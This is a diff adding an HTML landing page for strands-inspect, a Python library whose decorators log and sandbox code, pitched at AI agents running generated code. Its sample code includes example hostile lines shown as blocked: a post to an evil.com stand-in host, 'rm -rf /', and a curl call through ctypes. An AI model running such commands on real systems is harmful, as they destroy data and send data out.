@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>strands-inspect</title>
+  <meta name="description" content="See what your code does. Control what it can do."/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root{--bg:#0a0a0a;--card:rgba(255,255,255,.02);--bdr:rgba(255,255,255,.08);--tx:#e0e0e0;--dim:rgba(255,255,255,.45);--mut:rgba(255,255,255,.22);--w:#fff;--r:#e85050;--f:'Inter',system-ui,sans-serif;--m:'Space Mono',monospace}
+    *{box-sizing:border-box;margin:0;padding:0}html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:rgba(255,255,255,.1) transparent}
+    body{font-family:var(--f);background:var(--bg);color:var(--tx);overflow-x:hidden;-webkit-font-smoothing:antialiased}
+    body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;opacity:.02;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}
+    ::selection{background:rgba(255,255,255,.12)}::-webkit-scrollbar{width:5px}::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:3px}
+    #wave{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.45}
+    a{color:inherit;text-decoration:none}.c{max-width:900px;margin:0 auto;padding:0 28px;position:relative;z-index:1}
+    nav{position:fixed;top:0;left:0;right:0;z-index:1000;padding:16px 0;background:rgba(10,10,10,.8);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid var(--bdr)}
+    nav .c{display:flex;align-items:center;justify-content:space-between}
+    .n-brand{font-size:15px;font-weight:700;letter-spacing:-.3px;color:var(--w)}
+    .n-links{display:flex;align-items:center;gap:28px}
+    .n-link{font-size:13px;color:var(--dim);transition:color .2s}.n-link:hover{color:var(--w)}
+    .n-cta{font-size:12px;font-weight:700;padding:8px 18px;border-radius:8px;background:var(--w);color:#000;font-family:var(--m)}.n-cta:hover{opacity:.85}
+    .hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:160px 0 100px}
+    .hero h1{font-size:clamp(40px,6.5vw,72px);font-weight:900;line-height:1.05;letter-spacing:-2.5px;color:var(--w);margin-bottom:24px;max-width:700px}
+    .hero-sub{font-size:18px;color:var(--dim);line-height:1.65;max-width:520px;margin-bottom:40px}
+    .hero-install{font-family:var(--m);font-size:14px;padding:14px 24px;background:rgba(255,255,255,.04);border:1px solid var(--bdr);border-radius:10px;display:inline-block;color:var(--w);margin-bottom:36px;cursor:pointer;transition:all .2s}
+    .hero-install:hover{background:rgba(255,255,255,.07)}.hero-install span{color:var(--dim)}
+    .hero-links{display:flex;gap:12px;flex-wrap:wrap}
+    .btn{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;transition:all .2s;border:none;font-family:var(--f)}
+    .btn-w{background:var(--w);color:#000}.btn-w:hover{opacity:.85}
+    .btn-o{background:transparent;color:var(--dim);border:1px solid var(--bdr)}.btn-o:hover{border-color:rgba(255,255,255,.2);color:var(--w)}
+    .sec{padding:100px 0}.sec-border{border-top:1px solid var(--bdr)}
+    .sec-label{font-size:11px;font-weight:700;color:var(--mut);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;font-family:var(--m)}
+    .sec-title{font-size:clamp(28px,4vw,42px);font-weight:800;color:var(--w);letter-spacing:-1.2px;line-height:1.1;margin-bottom:16px}
+    .sec-desc{font-size:16px;color:var(--dim);line-height:1.7;max-width:520px;margin-bottom:48px}
+    .term{background:rgba(255,255,255,.02);border:1px solid var(--bdr);border-radius:14px;overflow:hidden;margin:40px 0}
+    .term-bar{display:flex;align-items:center;gap:7px;padding:12px 16px;border-bottom:1px solid var(--bdr)}
+    .term-dot{width:10px;height:10px;border-radius:50%}
+    .term-label{font-size:11px;color:var(--mut);font-family:var(--m);margin-left:auto}
+    .term-body{padding:20px;font-family:var(--m);font-size:12.5px;line-height:2;color:var(--dim)}
+    .term-body .kw{color:#8a8aaa}.term-body .fn{color:var(--w)}.term-body .str{color:#a0a0a0}.term-body .cm{color:var(--mut)}.term-body .red{color:var(--r)}
+    .two{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+    .two-card{padding:32px 24px;border-radius:14px;border:1px solid var(--bdr);background:var(--card);transition:all .3s}
+    .two-card:hover{border-color:rgba(255,255,255,.15)}
+    .two-card h3{font-size:22px;font-weight:800;color:var(--w);margin-bottom:4px;letter-spacing:-.3px;font-family:var(--m)}
+    .two-card .sub{font-size:13px;color:var(--mut);margin-bottom:14px}
+    .two-card p{font-size:14px;color:var(--dim);line-height:1.6}
+    .cases{display:flex;flex-direction:column}.case{padding:32px 0;border-bottom:1px solid var(--bdr)}.case:last-child{border-bottom:none}
+    .case-n{font-size:11px;font-family:var(--m);color:var(--mut);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px}
+    .case-title{font-size:18px;font-weight:700;color:var(--w);margin-bottom:6px}
+    .case-desc{font-size:14px;color:var(--dim);line-height:1.6;max-width:600px}
+    .examples{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+    .ex-card{padding:24px;border-radius:12px;border:1px solid var(--bdr);background:var(--card);cursor:pointer;transition:all .3s}
+    .ex-card:hover{border-color:rgba(255,255,255,.15);transform:translateY(-2px)}
+    .ex-card h4{font-size:14px;font-weight:700;color:var(--w);margin-bottom:6px}.ex-card p{font-size:12px;color:var(--dim);line-height:1.5}
+    .ex-card .ex-stats{font-family:var(--m);font-size:11px;color:var(--mut);margin-top:10px}
+    .viewer-wrap{border-radius:16px;border:1px solid var(--bdr);overflow:hidden;background:#000}
+    .viewer-bar{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:rgba(255,255,255,.02);border-bottom:1px solid var(--bdr)}
+    .viewer-bar-dots{display:flex;gap:7px}.viewer-iframe{width:100%;height:640px;border:none}
+    .cta{text-align:center;padding:120px 0}.cta h2{font-size:clamp(28px,4vw,40px);font-weight:800;color:var(--w);letter-spacing:-1px;margin-bottom:14px}
+    .cta p{font-size:16px;color:var(--dim);margin-bottom:32px}.cta-actions{display:flex;justify-content:center;gap:12px;flex-wrap:wrap}
+    footer{padding:40px 0;border-top:1px solid var(--bdr)}.foot{display:flex;align-items:center;justify-content:space-between;font-size:12px;color:var(--mut)}
+    .foot a{color:var(--dim)}.foot a:hover{color:var(--w)}.foot-links{display:flex;gap:24px}
+    .rv{opacity:0;transform:translateY(24px);transition:all .6s cubic-bezier(.16,1,.3,1)}.rv.v{opacity:1;transform:translateY(0)}
+    @media(max-width:768px){.n-link{display:none}.two{grid-template-columns:1fr}.examples{grid-template-columns:1fr}.foot{flex-direction:column;gap:16px;text-align:center}}
+  </style>
+</head>
+<body>
+<canvas id="wave"></canvas>
+
+<nav><div class="c">
+  <a href="#" class="n-brand">strands-inspect</a>
+  <div class="n-links">
+    <a href="#watch-lock" class="n-link">@watch / @lock</a>
+    <a href="#examples" class="n-link">Examples</a>
+    <a href="#viewer" class="n-link">Viewer</a>
+    <a href="https://github.com/cagataycali/strands-inspect" target="_blank" class="n-link">GitHub</a>
+    <a href="https://pypi.org/project/strands-inspect" target="_blank" class="n-cta">pip install</a>
+  </div>
+</div></nav>
+
+<section class="hero"><div class="c">
+  <h1 class="rv">See what your code does. Control what it can do.</h1>
+  <p class="hero-sub rv">Two decorators. Any Python function. From logging every file read to kernel-level isolation where even C extensions can't escape.</p>
+  <div class="hero-install rv" onclick="navigator.clipboard.writeText('pip install strands-inspect');this.querySelector('span').textContent='copied!'">pip install strands-inspect <span>· click to copy</span></div>
+  <div class="hero-links rv">
+    <a href="#watch-lock" class="btn btn-w">How it works →</a>
+    <a href="https://github.com/cagataycali/strands-inspect" target="_blank" class="btn btn-o"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>GitHub</a>
+  </div>
+  <div class="term rv">
+    <div class="term-bar"><div class="term-dot" style="background:#555"></div><div class="term-dot" style="background:#444"></div><div class="term-dot" style="background:#333"></div><div class="term-label">@watch · @lock</div></div>
+    <div class="term-body">
+      <div><span class="kw">from</span> strands_inspect <span class="kw">import</span> <span class="fn">watch</span>, <span class="fn">lock</span></div>
+      <div>&nbsp;</div>
+      <div><span class="fn">@watch</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># see everything</span></div>
+      <div><span class="kw">def</span> <span class="fn">process</span>(data): ...</div>
+      <div>&nbsp;</div>
+      <div><span class="fn">@watch</span>(policy=<span class="str">"sandbox"</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># see + block</span></div>
+      <div><span class="kw">def</span> <span class="fn">untrusted</span>(code):</div>
+      <div>&nbsp; &nbsp; requests.post(<span class="str">"http://evil.com"</span>) <span class="cm"># ← <span class="red">blocked</span></span></div>
+      <div>&nbsp; &nbsp; os.system(<span class="str">"rm -rf /"</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># ← <span class="red">blocked</span></span></div>
+      <div>&nbsp;</div>
+      <div><span class="fn">@lock</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># kernel-level</span></div>
+      <div><span class="kw">def</span> <span class="fn">alien</span>(x):</div>
+      <div>&nbsp; &nbsp; ctypes.CDLL(<span class="str">"libc.so"</span>).system(<span class="str">"curl evil.com"</span>)</div>
+      <div>&nbsp; &nbsp; <span class="cm"># ← <span class="red">💀 killed by kernel</span></span></div>
+    </div>
+  </div>
+</div></section>
+
+<section class="sec sec-border" id="watch-lock"><div class="c">
+  <div class="sec-label rv">Two words you already know</div>
+  <div class="two rv">
+    <div class="two-card">
+      <h3>@watch</h3>
+      <div class="sub">see everything</div>
+      <p>Records every file open, network call, subprocess, import, and eval. Full session replay. Add a policy to block what you don't want.</p>
+    </div>
+    <div class="two-card">
+      <h3>@lock</h3>
+      <div class="sub">nothing escapes</div>
+      <p>Forks a subprocess. Kernel-level restrictions. macOS Seatbelt, Linux seccomp-bpf. Even ctypes, mmap, inline assembly — the kernel kills it.</p>
+    </div>
+  </div>
+</div></section>
+
+<section class="sec sec-border"><div class="c">
+  <div class="sec-label rv">When to use it</div>
+  <div class="sec-title rv">Your AI agent wants to run<br/>code you've never seen.</div>
+  <div class="cases">
+    <div class="case rv">
+      <div class="case-n">AI agents</div>
+      <div class="case-title">Agent executes LLM-generated code</div>
+      <div class="case-desc"><code style="font-family:var(--m);color:var(--w)">@watch(policy="sandbox")</code> lets it run while blocking network, writes, subprocess. Tries to exfiltrate data? Denied.</div>
+    </div>
+    <div class="case rv">
+      <div class="case-n">Profiling</div>
+      <div class="case-title">Your pipeline is slow</div>
+      <div class="case-desc"><code style="font-family:var(--m);color:var(--w)">@watch</code> gives you memory timeline, CPU flamegraph, per-line allocations, GC stats. Drop the JSON into the viewer.</div>
+    </div>
+    <div class="case rv">
+      <div class="case-n">Audit</div>
+      <div class="case-title">You're evaluating a package</div>
+      <div class="case-desc">Wrap the entry point with <code style="font-family:var(--m);color:var(--w)">@watch</code>. See every file it reads, every URL it calls, every subprocess it spawns.</div>
+    </div>
+    <div class="case rv">
+      <div class="case-n">Nuclear option</div>
+      <div class="case-title">The code is truly foreign</div>
+      <div class="case-desc"><code style="font-family:var(--m);color:var(--w)">@lock</code> — kernel sandbox. The process gets SIGKILL. Nothing escapes.</div>
+    </div>
+  </div>
+</div></section>
+
+<section class="sec sec-border"><div class="c">
+  <div class="sec-label rv">For agents</div>
+  <div class="sec-title rv">One tool. Any package.</div>
+  <div class="term rv">
+    <div class="term-bar"><div class="term-dot" style="background:#555"></div><div class="term-dot" style="background:#444"></div><div class="term-dot" style="background:#333"></div><div class="term-label">inspect_tool</div></div>
+    <div class="term-body">
+      <div><span class="kw">from</span> strands <span class="kw">import</span> Agent</div>
+      <div><span class="kw">from</span> strands_inspect <span class="kw">import</span> inspect_tool</div>
+      <div>&nbsp;</div>
+      <div>agent = Agent(tools=[inspect_tool])</div>
+      <div>agent(<span class="str">"scan the requests library"</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># scan</span></div>
+      <div>agent(<span class="str">"call json.dumps with {'a': 1}"</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># call</span></div>
+      <div>agent(<span class="str">"profile this sorting algorithm"</span>) &nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># profile</span></div>
+      <div>agent(<span class="str">"find dead code in my_package"</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># graph</span></div>
+    </div>
+  </div>
+</div></section>
+
+<section class="sec sec-border" id="examples"><div class="c">
+  <div class="sec-label rv">See it</div>
+  <div class="sec-title rv">Click to load into the viewer.</div>
+  <div class="examples rv">
+    <div class="ex-card" onclick="loadExample('examples/sandbox_malicious.json')">
+      <h4>🚫 Catching malicious code</h4>
+      <p>Agent tries to exfiltrate /etc/passwd. Sandbox catches every attempt.</p>
+      <div class="ex-stats">4 denied · 6 syscalls · 3ms</div>
+    </div>
+    <div class="ex-card" onclick="loadExample('examples/profile_data_pipeline.json')">
+      <h4>📊 Data pipeline</h4>
+      <p>50k-row pandas pipeline. apply() eating 73% of runtime.</p>
+      <div class="ex-stats">12 MB peak · 284k calls · 847ms</div>
+    </div>
+    <div class="ex-card" onclick="loadExample('examples/profile_fibonacci.json')">
+      <h4>🔍 Fibonacci</h4>
+      <p>Recursive fib with memoization. Watch memory climb then GC.</p>
+      <div class="ex-stats">384 KB peak · 1.2k calls · 12ms</div>
+    </div>
+  </div>
+</div></section>
+
+<section class="sec" id="viewer"><div class="c">
+  <div class="sec-label rv">Viewer</div>
+  <div class="sec-title rv">Drop JSON. See everything.</div>
+  <div class="viewer-wrap rv">
+    <div class="viewer-bar">
+      <div class="viewer-bar-dots"><div class="term-dot" style="background:#555"></div><div class="term-dot" style="background:#444"></div><div class="term-dot" style="background:#333"></div></div>
+      <span style="font-size:11px;color:var(--mut);font-family:var(--m)">strands-inspect</span>
+    </div>
+    <iframe id="viewerFrame" src="viewer.html" class="viewer-iframe" title="viewer" loading="lazy"></iframe>
+  </div>
+</div></section>
+
+<section class="cta sec-border"><div class="c">
+  <h2 class="rv">See what it does. Control what it can do.</h2>
+  <p class="rv">MIT · Python 3.10+ · One dependency · Everything else is stdlib</p>
+  <div class="cta-actions rv">
+    <a href="https://pypi.org/project/strands-inspect/" target="_blank" class="btn btn-w">pip install strands-inspect</a>
+    <a href="https://github.com/cagataycali/strands-inspect" target="_blank" class="btn btn-o"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>GitHub</a>
+  </div>
+</div></section>
+
+<footer><div class="c"><div class="foot">
+  <span>strands-inspect · <a href="https://github.com/cagataycali" target="_blank">@cagataycali</a></span>
+  <div class="foot-links"><a href="https://github.com/cagataycali/strands-inspect" target="_blank">GitHub</a><a href="https://pypi.org/project/strands-inspect/" target="_blank">PyPI</a><a href="https://github.com/strands-agents/sdk-python" target="_blank">Strands</a></div>
+</div></div></footer>
+
+<script>
+const obs=new IntersectionObserver(e=>{e.forEach(e=>{if(e.isIntersecting)e.target.classList.add('v')})},{threshold:.06,rootMargin:'0px 0px -30px 0px'});
+document.querySelectorAll('.rv').forEach(el=>obs.observe(el));
+document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const t=document.querySelector(a.getAttribute('href'));if(t)t.scrollIntoView({behavior:'smooth',block:'start'})})});
+function loadExample(url){fetch(url).then(r=>r.json()).then(data=>{document.getElementById('viewerFrame').contentWindow.postMessage({type:'loadData',data},'*');document.getElementById('viewer').scrollIntoView({behavior:'smooth'})}).catch(e=>console.error(e))}
+(function(){const c=document.getElementById('wave');if(!c)return;const x=c.getContext('2d');let W,H,m={x:-1e3,y:-1e3},pts=[],cols,rows;const SP=32,DA=.97,SPR=.25,MR=140,MF=2.8;function rs(){W=c.width=innerWidth;H=c.height=innerHeight;cols=Math.ceil(W/SP)+2;rows=Math.ceil(H/SP)+2;pts=[];for(let r=0;r<rows;r++)for(let c2=0;c2<cols;c2++)pts.push({x:c2*SP,y:r*SP,ox:c2*SP,oy:r*SP,vx:0,vy:0})}function up(){for(const p of pts){const dx=p.x-m.x,dy=p.y-m.y,d=Math.sqrt(dx*dx+dy*dy);if(d<MR&&d>0){const f=(1-d/MR)*MF;p.vx+=dx/d*f;p.vy+=dy/d*f}p.vx+=(p.ox-p.x)*SPR;p.vy+=(p.oy-p.y)*SPR;p.vx*=DA;p.vy*=DA;p.x+=p.vx;p.y+=p.vy}}function dr(){x.clearRect(0,0,W,H);x.strokeStyle='rgba(255,255,255,.03)';x.lineWidth=.5;for(let r=0;r<rows;r++){x.beginPath();for(let c2=0;c2<cols;c2++){const p=pts[r*cols+c2];c2===0?x.moveTo(p.x,p.y):x.lineTo(p.x,p.y)}x.stroke()}for(let c2=0;c2<cols;c2++){x.beginPath();for(let r=0;r<rows;r++){const p=pts[r*cols+c2];r===0?x.moveTo(p.x,p.y):x.lineTo(p.x,p.y)}x.stroke()}for(const p of pts){const dx=p.x-m.x,dy=p.y-m.y,d=Math.sqrt(dx*dx+dy*dy);if(d<MR*1.5){const a=Math.max(0,(1-d/(MR*1.5))*.25);x.fillStyle='rgba(255,255,255,'+a+')';x.beginPath();x.arc(p.x,p.y,1.2,0,Math.PI*2);x.fill()}}}function lp(){up();dr();requestAnimationFrame(lp)}addEventListener('resize',rs);document.addEventListener('mousemove',e=>{m.x=e.clientX;m.y=e.clientY});document.addEventListener('mouseleave',()=>{m.x=-1e3;m.y=-1e3});rs();lp()})();
+</script>
+</body>
+</html>
